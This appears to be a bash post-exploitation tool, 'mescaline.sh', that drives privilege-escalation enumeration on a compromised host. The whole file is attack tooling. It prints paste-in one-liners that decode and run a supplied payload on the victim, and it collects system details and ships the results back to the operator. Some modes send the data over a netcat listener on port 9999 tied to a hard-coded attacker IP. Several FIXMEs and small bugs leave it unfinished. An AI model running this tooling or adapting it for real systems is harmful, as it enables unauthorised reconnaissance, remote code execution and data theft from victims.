#!/bin/bash

# mescaline.sh
# pre-privesc enumeration script-set, bourne again & posix shells
# written by mrush 10.2016
# m@root.dance
# https://github.com/nomasters

##############
# options
##############

[[ -z $@ ]] && echo "usage: $0 -x socks4://\$ipv4:\$port | -e | -p \$ts | -w" && exit

# default behavior
getFlag=1
enumFlag=1
shatterFlag=1
webFlag=0

# modify behavior
# verbosity. print banner and e.log recieved from the target. #FIXME bash wont interpret $v as a rederection char > nor |tee, nc thinks it should be receiveing an ip address... not sure why.
#[[ $@ =~ -v ]] && v='|tee' || v='>' 
# parse out each package from from shard.ps.txt and websearch for each banner
[[ $@ =~ -w ]] && { webFlag=1;}
# use a proxy. accepts a proxy address as '$proto://$ipv4:$port', for example 'socks4://127.0.0.1:8181'. expects socks4 without authentication
#[[ $@ =~ -x ]] && { p=$;}		
# enumerate and collect log but do not parse. 
[[ $@ =~ -e ]] && { shatterFlag=0;}	
# only parse an existing e.log. accepts a key formatted as '$ts'. key is passed to 'find /$dataDir/' as '-name $key.log'
[[ $@ =~ -p ]] && { getFlag=0;enumFlag=0;key=$(echo "$@" |sed -n -e 's/^.*-p *//p' |cut -d ' ' -f1);[[ -z $key ]] && echo '-p requires a $ts' && exit 1;}


##############
# variables
##############

ts=$(date +%s)
mescVer="0.0.1"
libDir="/usr/local/lib/mescaline"
enumDir="/usr/share/mescaline"
dataDir="/var/data/mescaline"

# FIXME fix these vars so they are determined programatically.
localIp=10.11.0.76
arch=ia32
abi=2.6.30 		# FIX ME to deremine abi version compat from the kernel banner
sh=posix

##############
# functions
##############

e_parseBan () {
  ip=$(cat $inbox/$ts/e.ban |cut -d \; -f1)
  uname=$(cat $inbox/$ts/e.ban |cut -d \; -f2)
  abi=$(cat $inbox/$ts/e.ban |cut -d \; -f3)
  sh=$(cat $inbox/$ts/e.ban |cut -d \; -f4)
  co=$(cat $inbox/$ts/e.ban |cut -d \; -f5)
  echo [+] [host:] [$ip]
  echo [+] [kern:] [$uname]
  echo [+] [abi:] [$abi]
  echo [+] [sh:] [$sh]
  echo [+] [comp:] [$co]
}

e_getTarget () {
  echo [*] Welcome to Mescaline $mescVer
  echo '[>] [enter target ip address]'
  echo '>>> ' |tr -d '\n'
  read hostip
  echo -en "\e[1A";
  # echo "[+] [set host: $hostip]"
  echo '[>] [does the target filter egress] [y/n]'
  echo '>>> ' |tr -d '\n'
  read egress
  [[ $egress =~ y ]] && mode=egress || mode=normal
  # echo "[+] [set mode: $mode]"
  echo -en "\e[1A";
  echo '[>] [is the target accessed through a proxy] [y/n]'
  echo '>>> ' |tr -d '\n'
  read p
  [[ $p =~ y ]] && { echo -en "\e[1A" && echo '[>] [enter socks4 proxy address] [127.0.0.1:8181]' && \
    echo '>>> ' |tr -d '\n' && read proxy; }
  echo -en "\e[1A";
  [[ -n $proxy ]] #&& echo "[+] [set proxy: $proxy]" || echo '[+] [set proxy: none]'
  echo '[>] [what is the target os type] [win/mac/lin/bsd/sunos/sol/cisco/android/ios/minix/dos/vms/ibm]'
  echo '>>> ' |tr -d '\n'
  read ostype
  # echo "[+] [set os type: $ostype]"
  declare -g inbox=$dataDir/$hostip
  mkdir -p $inbox/$ts
  # echo "[+] [set inbox: $inbox]"
}

e_enumHost () { # select the correct enum script, deploy it, and listen for connect to receive logs
# FIXME implement programmatic payload selection via the vars set in e_getTarget with insert os-specific logic
if [[ $mode == 'egress' ]]; then
  echo -en "\e[1A";
  echo '[>] [paste and run the following code on the host]'
  echo -e '\r'
  if [[ $ostype =~ nix ]]; then
    echo 'export TERM=xterm;clear;echo "[>] paste the following encoded banners into your mescaline prompt";echo -e "\r";u="`uname -a`";b="`file /bin/ls`";sh="`grep "^/bin/sh$" /etc/shells`";t=`/sbin/ifconfig |head -n2 |tac |head -n1 |sed -e "s/^ *//" |cut -d " " -f2`;i=`(echo $t |grep ":" 2>&1 >/dev/null) && echo $t |cut -d : -f2 || echo $t`;co="`for comp in xz bzip2 gzip zip shar; do which $comp && co=$comp && break; done`";s="`echo $i\;$u\;$b\;$sh\;$co |base64`";echo "$s" |tr -d "\n";echo -e "\n"; echo "[>] paste the encoded payload from the mescaline shell into this prompt";echo ">>> " |tr -d "\n"; read payload;echo "$payload" |base64 -d |gunzip >$r.sh;chmod +x $r.sh; ./$r.sh 2>err.log |gzip |base64 |tr -d "\n" >$r.log;echo -e "\r";echo "[>] paste the following encoded log into the mescaline shell"; echo -e "\r";l=`cat $r.log |wc -c`;s=4000;i=0;m=`expr $l / $s`;while [ "$i" -le "$m" ];do dd if=$r.log bs=$s count=1 skip=$i;echo -e "\r";i=`expr $i + 1`;done 2>/dev/null;echo -e "\r";echo "[ ] good luck :)";'
  echo -e '\r'
  else
    :; # FIXME handle all other osytpes here, to print their cli commands to get the banner and abi version
  fi
  echo '[>] [copy the banner string from the target and paste it into the prompt below]'
  echo '>>> ' |tr -d '\n'
  read encban
  echo -en "\e[1A"
  echo -en "\e[K"
  echo -en "\e[1A"
  echo -en "\e[K"
  # echo "[+] [received banner] [$inbox/$ts/e.ban]"
  echo "$encban" |base64 -d >$inbox/$ts/e.ban
  e_parseBan
  if [[ $ostype =~ nix ]]; then
    echo '[>] [paste and run the following code on the host]'
    echo -e '\r'
    ##minified="$(cat $enumDir/cli/posix/enum.sh |sed -e '/^[ \t]*#\+/d' -e '/^[ \t]*$/d' \
      ##-e 's/[ \t]\+#[ \t]\+.*$//g' |tr '\n' ';' |sed -e 's/{[ \t]*;/{ /g' -e 's/{[^ ]\+/{ /g' \
      ##-e 's/do[ \t]*;/do /g' -e 's/then[ \t]*;/then /g' -e 's/;[ \t]*;/;/g' -e 's/[ \t]\+;/;/g' \
      ##-e 's/;[ \t]\+/;/g' |tr -s ' ')";
    gzip /usr/share/mescaline/cli/posix/enum.sh -c |base64 |tr -d '\n'
    echo -e '\n'
  #else # FIXME handle all other osytpes here, to print their cli commands to get the banner and abi version
  fi
  echo '[>] [copy the encoded log string from the target and paste it into the prompt, then type EOF and press enter]'
  until [ "$enclog" = "EOF" ]; do 
    echo '>>> ' |tr -d '\n';
    read enclog
    echo "$enclog" >>$inbox/$ts/e.log.gz.b64
  done
  # echo -en "\e[1A"
  # echo -en "\e[1A"
  echo -e "\r"
  echo "[+] [received log: $inbox/$ts/e.log.gz.b64]"
  sed -e '/EOF/d' <$inbox/$ts/e.log.gz.b64 |tr -d '\n' |base64 -d -i |gunzip >$inbox/$ts/e.log
  echo "[+] [extracted log: $inbox/$ts/e.log]"
  less $inbox/$ts/e.log
elif [[ $mode == 'normal' ]]; then
  echo -en "\e[1A";
  echo '[>] [paste and run the following code on the host]'
  echo -e '\r'
  if [[ $ostype =~ nix ]]; then
    minified="$(cat $enumDir/cli/posix/enum.sh |sed -e '/^#\(#\| \|!\)/d' -e '/^$/d' \
      -e 's/[ \t]\+#[ \t]\+.*$//g' |tr '\n' ';' |tr -s ' ' |sed -e 's/{;/{ /g' \
      -e 's/{[^ ]*/{ /g' -e 's/do;/do /g')";
    append=" >s;chmod +x s;sh s $localIp 2>/dev/null";
    echo echo \'$minified\'$append
  #else # FIXME handle all other osytpes here, to print their cli commands to get the banner and abi version
  fi
  echo -e '\r'
  echo [*] [receiving banner:] [enum]
  nc -nlp 9999 > $inbox/$ts/e.ban # nc -nlp 9999 |tee $inbox/$ts/e.ban # verbose alternative
  e_parseBan
  # FIXME programmatically get the correct nc and e.sh based on vars from e_getTarget and banner/abi from target 
    # send ncat.arch.bin & e.sh.dialect.
    # echo [*] [sending ncat:] [$os $arch $abi]
    # cp -v e.client.sh /var/www/html/e.sh
  echo "[*] [sending enum:] [posix]"
  echo [*] [receiving log:] [$inbox/$ts/e.log]
  nc -nlp 9999 > $inbox/$ts/e.log # nc -nlp 9999 |tee $inbox/$ts/e.log # verbose alternative
  less $inbox/$ts/e.log
fi
}

e_shatter () {
  declare -a titleArray
  dir=$1
  file=$dir/e.log
  [[ -z $file ]] && echo no host directory at $inbox && exit 1
  [[ ! -e $file ]] && echo no such e.log file \'$file\' && exit 1
  outbox="$(echo $file |rev |cut -d / -f2- |rev)"
  cat "$file" |nl -n ln  |grep '\[ ' |
  {
    while read line; do
      index=$(echo "$line" |cut -d ' ' -f1)
      title=$(echo "$line" |rev |cut -d ' ' -f1 |rev)
      titleArray+=("$index $title")
    done
    for i in "${!titleArray[@]}"; do
      index=$(echo "${titleArray[$i]}" |cut -d ' ' -f1)
      title=$(echo "${titleArray[$i]}" |rev |cut -d ' ' -f1 |rev)
      endKey=$(($i+1))
      endIndex=$(echo "${titleArray[$endKey]}" |cut -d ' ' -f1)
      # determine how long the section is
      index=$((index+1))                 # offset
      length=$((endIndex-index-2))
      # now proceed
      shard=shard.${title,,}.txt
      echo [+] [section ${title,,}] [$outbox/$shard]
      echo -e "[ ] $title \r" >$outbox/$shard
      cat "$file" |sed -e '/^$/d' |nl -n ln |grep -A "$length" "^$index " 2>/devnull |sed -e 's/^[0-9]\+[ ]\+[\t]*//' |sed -e 's/^\[.*\]/\n&/' |sed -e 's/^[^[]/&/' >>$outbox/$shard
    done
    q=${#titleArray[@]}
    echo [ ] [parsed e.log into $q sections]
    echo -e '\r'
  }
}

e_shatterLog () {
  key="$1"
  # break up e.log into one file per section
  [[ -z $key ]] && key=$ts
  f="$(find $dataDir -name *$key*)"
  [[ $(echo "$f" |wc -l) != 1 ]] && echo non-unique ts && exit 1
  [[ -z $inbox ]] && declare -g inbox && inbox="$(echo "$f" |rev |cut -d / -f2- |rev)"
  echo [*] [preparing enumeration data]
  echo -e '\r'
  e_shatter "$f"
}

e_pipeToWeb () {
  key="$1"
  cat $inbox/$key/shard.packages.txt |sed -e '/^\+\+\+/d' -e '/^[[] []] [A-Z]\+/d' -e '/^[[][a-z _-]\+[]][ ]*$/d' -e '/^$/d' | /$libDir/parse.ps.sh   
}

##############
# flow control
##############

# override logic
[[ $getFlag == 1 ]] && e_getTarget
[[ $enumFlag == 1 ]] && e_enumHost
[[ $shatterFlag == 1 ]] && e_shatterLog $key
[[ $webFlag == 1 ]] && e_pipeToWeb $key
